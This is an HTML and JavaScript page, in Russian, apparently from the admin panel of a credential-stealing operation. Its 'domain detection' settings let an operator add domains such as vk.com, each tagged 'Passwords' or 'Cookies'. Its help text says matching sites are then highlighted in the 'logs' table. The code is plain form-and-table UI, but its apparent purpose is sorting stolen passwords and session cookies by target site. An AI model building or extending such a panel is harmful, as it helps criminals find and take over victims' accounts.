<div class="row">
	<div class="col-12">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Управление определением доменов <button class="btn btn-outline-secondary btn-circle btn-circle-sm" data-toggle="modal" data-target="#quest_modal_domains"><i class="fas fa-question"></i></button></h4>

				<button class="btn btn-purple" data-toggle="modal" data-target="#add_dd_modal">Добавить</button>

				<div class="table-responsive">
					<table class="table">
						<thead>
							<tr>
								<th>Домен</th>
								<th>Тип</th>
								<th>Управление</th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="quest_modal_domains" tabindex="-1" role="dialog">
	<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Определение доменов</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<p>Эта система создана, чтобы упростить проверку логов. Теперь, чтобы определить, есть ли в логе нужный вам домен, достаточно просто задать настройку и взлянуть на главную таблицу. Если в логе найдется сайт, соответствующий вашему запросу он будет показан вам рядом с данными лога</p>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Ок</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="add_dd_modal" tabindex="-1" role="dialog">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Добавить домен</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="form-group">
					<label for="domain_input">Домен</label>
					<input type="text" placeholder="Например, vk.com..." id="domain_input" class="form-control">
				</div>
				<div class="form-group">
					<label for="type_select">Тип</label>
					<select id="type_select" class="form-control custom-select">
						<option value="1">Пароли</option>
						<option value="2">Куки</option>
					</select>
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" id="add_dd" class="btn btn-purple">Добавить</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="edit_dd_modal" tabindex="-1" role="dialog">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Изменить домен</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="form-group">
					<label for="edit_domain_input">Домен</label>
					<input type="text" placeholder="Например, vk.com..." id="edit_domain_input" class="form-control">
				</div>
				<div class="form-group">
					<label for="edit_type_select">Тип</label>
					<select id="edit_type_select" class="form-control custom-select">
						<option value="1">Пароли</option>
						<option value="2">Куки</option>
					</select>
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" id="edit_dd" class="btn btn-purple">Изменить</button>
			</div>
		</div>
	</div>
</div>

<script>
	var dd_table;
	var editing_id;

	$(document).ready(function() {
		dd_table = $("table").DataTable({
			dom: "t",
			ajax: {
				type: "POST",
				url: "/settings/info/dd_table",
			},
			columns: [
				{ data: "domain" },
				{ 
					data: "type", 
					render: function(data, type, row) {
						if(type == "display") {
							if(data == "1")
								return "Пароли";
							else if(data == "2")
								return "Куки";
						}
						else
							return data;
					}
				},
				{ 
					orderable: false,
					data: "id", 
					render: function(data, type, row) {
						return "<div class='btn-group'><button class='btn btn-info' onclick='info_dd(" + data + ")'><i class='fas fa-info'></i></buttton><button class='btn btn-danger' onclick='delete_dd(" + data + ")'><i class='fas fa-trash-alt'></i></buttton></div>"
					},
				}
			],
		});
	});

	$("#add_dd").click(function() {
		domain = $("#domain_input").val();
		type = $("#type_select").val();

		if(domain != "") {
			data = CheckData(sendData("/settings/save/dd", {"domain": domain, "type": type}));
			if(data) {
				$("#add_dd_modal").modal('hide');
				dd_table.ajax.reload();
				
				SuccessAlert("Настройки сохранены");
			}
		}
	});

	$("#edit_dd").click(function() {
		domain = $("#edit_domain_input").val();
		type = $("#edit_type_select").val();

		if(domain != "") {
			data = CheckData(sendData("/settings/edit/dd", {"domain": domain, "type": type, "id": editing_id}));
			if(data) {
				$("#edit_dd_modal").modal('hide');
				dd_table.ajax.reload();
				
				SuccessAlert("Настройки сохранены");
			}
		}
	});

	function info_dd(id) {
		editing_id = id;

		data = sendData("/settings/info/dd", {"id": id});
		$("#edit_domain_input").val(data["domain"]);
		$("#edit_type_select").val(data["type"]);

		$("#edit_dd_modal").modal();
	} 

	function delete_dd(id) {
		swal.fire({
			type: "warning",
			title: "Вы уверены?",
			text: "Если вы продолжите, то выбранный вами domain detect будет удален",
			showCancelButton: true,
	        confirmButtonText: 'Да, удалить',
	        cancelButtonText: 'Назад',
	        customClass: {
				popup: 'swal-popup-class',
				title: 'swal-title-class',
			},
	    }).then((result) => {
	        if (result.value) {
	        	data = CheckData(sendData("/settings/delete/dd", {"id": id}));
	        	if(data) {
	        		SuccessAlert("Успешно удалено");
	        		dd_table.ajax.reload();
	        	}
	        }
	    });
	}
</script>